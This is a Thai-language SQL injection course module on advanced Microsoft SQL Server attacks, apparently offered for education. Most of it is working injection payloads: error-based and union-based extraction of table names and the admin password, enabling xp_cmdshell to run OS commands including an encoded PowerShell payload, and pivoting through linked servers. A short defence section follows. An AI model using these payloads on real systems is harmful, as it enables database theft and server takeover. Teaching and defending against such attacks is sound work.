# Part 073: Advanced MSSQL Techniques

## ภาพรวม

เทคนิค SQL injection ขั้นสูงสำหรับ Microsoft SQL Server

**ขั้นตอนที่ 1166-1180**

---

## 1166. MSSQL Error-Based Techniques

```sql
-- Technique 1: CONVERT error
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.objects))-- -
-- Error: Conversion failed when converting the nvarchar value 'tablename'

-- Technique 2: XML PATH trick
' AND 1=1; DECLARE @v NVARCHAR(200);
SELECT @v=name FROM sys.objects WHERE id=OBJECT_ID('users');
SELECT CONVERT(int,@v)-- -

-- Technique 3: Subquery in WHERE
' AND 1=(SELECT 1/0 WHERE (SELECT user_pass FROM users WHERE user_login='admin') LIKE 'a%')-- -

-- Technique 4: sys.messages (error messages contain data)
' AND EXISTS(SELECT * FROM openrowset('SQLOLEDB','server=.;uid=sa;pwd=;','SELECT 1'))-- -
```

---

## 1167. MSSQL Union-Based

```sql
-- หา column count:
' ORDER BY 1-- -
' ORDER BY 2-- -
จนกว่าจะ error

-- String columns ใน MSSQL:
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -

-- เมื่อแตก type mismatch:
' UNION SELECT NULL,NULL,NULL,NULL-- -
-- แก้ type:
' UNION SELECT '1',NULL,NULL,NULL-- -
' UNION SELECT '1','2',NULL,NULL-- -

-- Extract:
' UNION SELECT @@version,DB_NAME(),USER_NAME(),SYSTEM_USER-- -
' UNION SELECT name,NULL,NULL,NULL FROM sys.databases-- -
' UNION SELECT name,NULL,NULL,NULL FROM sys.objects WHERE type='U'-- -
```

---

## 1168. xp_cmdshell และ OS Commands

```sql
-- เปิด xp_cmdshell (ต้อง sysadmin):
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- เรียกใช้:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig';

-- เก็บผลใน temp table:
CREATE TABLE #cmd_output (output NVARCHAR(4000));
INSERT INTO #cmd_output EXEC xp_cmdshell 'dir C:\';
SELECT * FROM #cmd_output;
DROP TABLE #cmd_output;

-- ผ่าน SQLi (injection context):
'; EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD'-- -

-- Disable สำหรับการป้องกัน:
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

---

## 1169. Linked Servers

```sql
-- Linked servers เสมือน bridges ไป DB server อื่น

-- ดู linked servers:
SELECT name, product, data_source FROM sys.servers
WHERE is_linked = 1;

-- Query linked server:
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT name FROM master.dbo.sysdatabases');

-- Execute command via linked server:
EXEC [LinkedServer].master.dbo.xp_cmdshell 'whoami';

-- Inject ผ่าน linked server:
'; SELECT * FROM OPENQUERY([DB_SERVER_2], 'SELECT TOP 1 user_pass FROM users')-- -
```

---

## 1170. MSSQL Defense

```sql
-- การป้องกัน:

-- 1. ปิด xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- 2. ใช้ least privilege
CREATE LOGIN app_user WITH PASSWORD='StrongPass123!';
GRANT SELECT, INSERT ON app_schema.tables TO app_user;
-- ไม่ให้ sysadmin, db_owner

-- 3. Parameterized queries (C#):
// SqlCommand cmd = new SqlCommand(
//     "SELECT * FROM users WHERE id = @id", conn);
// cmd.Parameters.AddWithValue("@id", userId);

-- 4. เปิด audit
CREATE SERVER AUDIT audit_trail
  TO FILE (FILEPATH = 'C:\AuditLogs\', MAXSIZE=100MB);
CREATE SERVER AUDIT SPECIFICATION sqli_detect
  FOR SERVER AUDIT audit_trail
  ADD (FAILED_LOGIN_GROUP);
ALTER SERVER AUDIT audit_trail WITH (STATE=ON);
```

---

## สรุป

Advanced MSSQL:
- **Error-based** - CONVERT, XML PATH
- **Union-based** - sys.objects, sys.databases
- **xp_cmdshell** - OS command execution
- **Linked servers** - lateral movement
- **Defense** - disable dangerous features, least privilege

---

*Part 073 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
